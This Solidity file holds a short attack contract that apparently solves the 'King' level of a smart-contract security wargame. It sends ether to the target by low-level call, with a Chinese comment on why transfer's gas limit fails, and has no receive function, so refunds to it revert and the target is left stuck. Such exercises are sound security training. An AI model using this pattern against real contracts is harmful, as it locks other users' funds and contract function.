// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    uint256 public balance;

    constructor() payable {
        balance = msg.value;
    }

    function attack(address payable _addr) public {
        // 这里需要用 call 不能用 transfer 函数, 因为 transfer 有 2300 gas 的限制. 无法满足 King 合约的 receive 方法消耗
        (bool success, ) = _addr.call{value: balance}("");
        require(success, "Transfer failed");
        balance = 0;
    }
}